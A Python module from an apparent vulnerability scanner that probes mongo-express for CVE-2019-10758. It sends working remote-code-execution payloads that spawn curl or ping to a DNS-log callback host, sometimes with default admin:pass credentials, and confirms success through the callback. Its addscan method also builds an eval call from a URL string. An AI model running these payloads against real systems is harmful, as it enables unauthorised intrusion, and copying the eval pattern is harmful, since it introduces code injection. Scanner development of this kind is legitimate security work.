#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
mongo-express是一款mongodb的第三方Web界面, 使用node和express开发
    Mongo-Express扫描类: 
        mongo-express 未授权远程代码执行
            CVE-2019-10758
                Payload: https://vulhub.org/#/environments/mongo-express/CVE-2019-10758/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class MongoExpress():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'mongo-express'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2019_10758_payloads = [
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl DNSdomain")',
                'headers': head.merge(self.headers, {
                    'Authorization': 'Basic YWRtaW46cGFzcw=='
                })
                
            },
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping DNSdomain")',
                'headers': head.merge(self.headers, {
                    'Authorization': 'Basic YWRtaW46cGFzcw=='
                })
            },
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl DNSdomain")',
                'headers': head.merge(self.headers, {})
                
            },
            {
                'path': 'checkValid',
                'data': 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ping DNSdomain")',
                'headers': head.merge(self.headers, {})
            }
        ]

    def cve_2019_10758_scan(self, url):
        ''' 如果可以成功登录, 或者目标服务器没有修改默认的账号密码(admin:pass), 则可以执行任意node.js代码 '''
        sessid = '3d2f0881262d8bd19e65a6ce89229c5e'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-10758'
        vul_info['vul_method'] = 'POST'


        for payload in self.cve_2019_10758_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']
            data = payload['data'].replace('DNSdomain', dns_domain)
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(2)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2019_10758_scan, url=url)
        ]

mongoexpress = MongoExpress()
